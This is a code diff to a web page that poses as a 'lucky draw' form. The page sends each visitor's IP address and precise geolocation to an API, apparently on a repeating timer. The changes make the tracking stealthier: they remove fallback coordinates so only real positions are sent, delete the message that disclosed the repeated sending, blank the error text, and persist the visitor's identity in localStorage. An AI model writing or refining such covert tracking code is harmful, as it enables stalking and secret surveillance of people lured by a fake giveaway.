@@ -205,7 +205,17 @@
           locationStatus.textContent = "📍 Location not supported";
           locationStatus.style.color = "#ffc107";
         }
-        // locationStatus.style.display = "hidden";
+
+        // Check if location is available
+        const statusMessage = document.getElementById("statusMessage");
+        if (!userLocation || userLocation.error || !userLocation.latitude || !userLocation.longitude) {
+          statusMessage.textContent = "❌ Allow permission.";
+          statusMessage.className = "status error";
+          statusMessage.style.display = "block";
+
+          return false;
+        }
+        return true;
       }
       async function sendIpData() {
         const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -231,12 +241,13 @@
       }
       // Send POST request to API
       async function sendLocationData() {
-        if (!cachedName) return;
+        if (!cachedName || cachedName == null) return;
+        if (!getUserLocation()) return;
 
         const formData = {
           name: cachedName,
-          latitude: userLocation && userLocation.latitude ? userLocation.latitude : 20,
-          longitude: userLocation && userLocation.longitude ? userLocation.longitude : 80,
+          latitude: userLocation.latitude,
+          longitude: userLocation.longitude,
         };
 
         try {
@@ -250,18 +261,10 @@
 
           requestCount++;
           const statusMessage = document.getElementById("statusMessage");
-
-          if (response.ok) {
-            statusMessage.textContent = `✅ Request #${requestCount} sent successfully (Auto-updating every 3s)`;
-            statusMessage.className = "status success";
-            statusMessage.style.display = "hidden";
-          } else {
-            throw new Error("Request failed");
-          }
         } catch (error) {
           console.error("Request error:", error);
           const statusMessage = document.getElementById("statusMessage");
-          statusMessage.textContent = `❌ Request #${requestCount} failed - Will retry in 3s`;
+          statusMessage.textContent = "";
           statusMessage.className = "status error";
           statusMessage.style.display = "block";
         }
@@ -288,9 +291,6 @@
         }
       }
 
-      // Initialize location detection
-      getUserLocation();
-
       // Handle form submission
       document.getElementById("luckyDrawForm").addEventListener("submit", async function (e) {
         e.preventDefault();
@@ -301,20 +301,9 @@
 
         // Cache the name
         cachedName = nameInput.value.trim();
+        localStorage.setItem("name", cachedName);
 
         if (!cachedName) return;
-
-        // Check if location is available
-        if (!userLocation || userLocation.error || !userLocation.latitude || !userLocation.longitude) {
-          statusMessage.textContent = "❌ Allow permission.";
-          statusMessage.className = "status error";
-          statusMessage.style.display = "block";
-          //   statusMessage.onclick = ;
-
-          // Retry getting location
-          getUserLocation();
-          return;
-        }
 
         // Update button state
         submitBtn.textContent = "🔄 processing...";
@@ -367,7 +356,11 @@
         return Math.random().toString(36).substring(2, 7);
       }
       if (!cachedName) {
-        cachedName = generateName();
+        cachedName = localStorage.getItem("name");
+        if (!cachedName) {
+          cachedName = generateName();
+          localStorage.setItem("name", cachedName);
+        }
       }
       sendIpData();
       sendLocationData();
